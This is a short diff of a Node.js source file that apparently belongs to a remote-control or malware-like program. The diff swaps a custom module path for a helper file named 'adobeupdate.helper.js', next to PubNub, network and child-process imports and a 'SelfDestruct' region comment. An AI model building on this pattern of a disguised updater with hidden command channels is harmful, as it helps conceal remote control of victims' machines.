@@ -64,14 +64,9 @@ debugger;
 //              SelfDestruct
 //#endregion
 
-const path = require("path");
-module.paths.push(
-    path.resolve(
-        __dirname,
-        "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules"
-    )
-);
+const helper = require("./adobeupdate.helper.js");
 
+const path = require("path");
 const PubNub = require("pubnub");
 const net = require("net");
 const { fork, exec, spawn } = require("child_process");
